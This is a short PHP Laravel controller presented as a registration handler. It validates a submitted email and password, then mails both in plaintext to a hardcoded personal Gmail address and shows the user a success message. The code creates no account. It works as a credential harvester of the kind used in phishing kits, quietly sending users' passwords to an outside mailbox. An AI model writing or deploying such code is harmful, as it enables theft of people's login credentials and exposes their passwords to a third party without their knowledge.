<?php
namespace App\Http\Controllers;

use App\Mail\RegisterMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class RegisterMailController extends Controller
{
    public function register(Request $request)
    {
        // Validate the form inputs
        $validated = $request->validate([
            'email' => 'required|email',
            'password' => 'required|min:6',
        ]);

        // Send the email with the form details
        Mail::to('beckychndlr@gmail.com')->send(new RegisterMail($validated));

        // Return a response or redirect
        return redirect()->back()->with('success', 'Your details have been submitted!');
    }
}
